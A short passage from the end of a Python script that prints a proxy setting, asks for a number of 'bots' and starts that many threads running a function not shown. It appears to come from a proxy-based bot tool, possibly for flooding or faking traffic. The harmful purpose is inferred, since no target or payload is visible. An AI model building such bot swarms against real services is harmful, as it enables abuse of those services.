        Proxy type=""")
    print(str(proxyuz))        
    botgir=input("\n\nNo of Bots:")
    if botgir=="":
        botgir=1
    botgir = int(botgir)
    for xdeep in range(botgir):
        XDeep = threading.Thread(target=XD)
        XDeep.start()

if __name__ == "__main__":
    main()